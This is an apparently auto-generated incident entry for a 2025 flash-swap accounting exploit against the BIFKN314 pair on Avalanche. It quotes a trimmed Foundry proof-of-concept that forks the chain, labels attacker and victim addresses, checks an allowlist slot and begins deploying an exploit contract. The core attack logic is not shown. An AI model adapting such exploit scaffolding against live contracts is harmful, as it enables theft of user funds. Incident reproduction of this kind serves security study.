# [?] AvaxBIFKNPair - Flash Swap Accounting

## Summary
Severity: Unknown
Chain: Avalanche
Component: AvaxBIFKNPair
Published: 2025-07-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/AvaxBIFKNPair_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2.4K USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x13459bC2Db6053524881415321667d5E16F5F15C;
    address private constant PAIR_TOKEN = 0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69;
    uint256 private constant PAIR_TOKEN_ALLOWLIST_SLOT = 6;
    uint256 private constant FORK_BLOCK = 66_181_042;
    uint256 private constant MIN_AVAX_PROFIT = 90 ether;

    function setUp() public {
        // step 1: fork before the attack transaction and configure the profit asset.
        vm.createSelectFork("avalanche", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, "WAVAX");
        vm.label(0x794a61358D6845594F94dc1DB02A252b5b4814aD, "Aave v3 pool");
        vm.label(0x3652E58bC41341B0026334AC20C2948E18c23136, "RadioShack pair");
        vm.label(PAIR_TOKEN, "pair token1");
        vm.label(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1, "BIFKN314 victim");
        vm.label(0xd4C6BA250bFF38218937422d7aCCf55552916558, "BIFKN314 LP token");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = ATTACKER.balance;
        // step 2: assert the pair-token allowlist precondition used by the historical tx.origin.
        bytes32 attackerAllowlistSlot = keccak256(abi.encode(ATTACKER, PAIR_TOKEN_ALLOWLIST_SLOT));
        assertEq(
            uint256(vm.load(PAIR_TOKEN, attackerAllowlistSlot)),
            1,
            "attacker tx.origin is not pair-token allowlisted"
        );

        vm.startPrank(ATTACKER, ATTACKER);
        AvaxBIFKNPairExploit exploit = new AvaxBIFKNPairExploit(ATTACKER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/AvaxBIFKNPair_exp.sol_
